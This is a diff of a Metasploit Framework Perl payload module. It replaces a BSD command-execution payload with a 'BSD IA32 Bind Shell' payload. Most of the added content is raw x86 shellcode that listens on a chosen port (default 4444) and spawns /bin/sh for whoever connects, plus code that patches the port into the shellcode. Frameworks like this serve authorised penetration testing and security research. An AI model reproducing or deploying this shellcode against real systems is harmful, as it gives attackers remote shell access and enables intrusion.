@@ -7,25 +7,20 @@
 # version of the Framework can always be obtained from metasploit.com.
 ##
 
-package Msf::Payload::bsdx86_exec;
+package Msf::Payload::bsd_ia32_bind;
 use strict;
-use base 'Msf::PayloadComponent::NoConnection';
-use Pex::x86;
+use base 'Msf::PayloadComponent::BindConnection';
 
 my $info =
 {
-  'Name'         => 'BSD Execute Command',
+  'Name'         => 'BSD IA32 Bind Shell',
   'Version'      => '$Revision$',
-  'Description'  => 'Execute an arbitrary command',
+  'Description'  => 'Listen for connection and spawn a shell',
   'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
   'Arch'         => [ 'x86' ],
   'Priv'         => 0,
   'OS'           => [ 'bsd' ],
   'Size'         => '',
-  'UserOpts'     =>
-   {
-      'CMD' => [1, 'DATA', 'The command string to execute'],
-   },
 };
 
 sub new {
@@ -40,27 +35,30 @@ sub new {
 
 sub Build {
   my $self = shift;
-  return($self->Generate($self->GetVar('CMD')));
+  return($self->Generate($self->GetVar('LPORT')));
 }
 
 sub Generate {
   my $self = shift;
-  my $cmd = shift;
+  my $port = shift;
+  my $off_port = 17;
+  my $port_bin = pack('n', $port);
 
-  my $shellcode =
-    "\x6a\x3b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x52".
-    "\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3".
-    "\x52".
-    Pex::x86::call(length($cmd)+1).
-    $cmd . "\x00".
-    "\x57\x53\x89\xe1\x52\x51\x53\x50\xcd\x80";
+  my $shellcode = # bsd bind shell by vlad902
+    "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x31\xc9\x51\xcd\x80\x68\x10".
+    "\x02\x04\x57\x89\xe3\x6a\x10\x53\x50\x50\x93\x6a\x68\x58\xcd\x80".
+    "\xb0\x6a\x51\xcd\x80\x51\x53\xb0\x1e\x50\xcd\x80\x93\x6a\x5a\x58".
+    "\x52\x53\x51\xcd\x80\x4a\x79\xf5\x68\x6e\x2f\x73\x68\x68\x2f\x2f".
+    "\x62\x69\x89\xe3\x51\x54\x53\xb0\x3b\x50\xcd\x80";
 
+
+  substr($shellcode, $off_port, 2, $port_bin);
   return($shellcode);
 }
 
 sub _GenSize {
   my $self = shift;
-  my $bin = $self->Generate('');
+  my $bin = $self->Generate('4444');
   return(length($bin));
 }
 
